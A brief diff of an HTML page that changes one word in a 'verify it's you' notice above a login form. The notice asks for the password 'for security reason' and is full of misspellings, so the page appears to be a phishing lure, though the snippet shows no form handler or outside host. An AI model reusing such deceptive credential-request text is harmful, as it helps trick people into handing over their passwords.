@@ -29,7 +29,7 @@ function myFunction() {
 			<div class="red-box">
 				<p style="font-weight:bold; font-size:13px">Verify needed to understand it's you</p>
 				<p>Enter your passwor for security reason (make sure yuor caps lock is off)</p>
-				<p>Forgot your password ? <a href="">Request new one</a>
+				<p>Forgot your passwords ? <a href="">Request new one</a>
 			</div>
 
 			<div class="login-form">
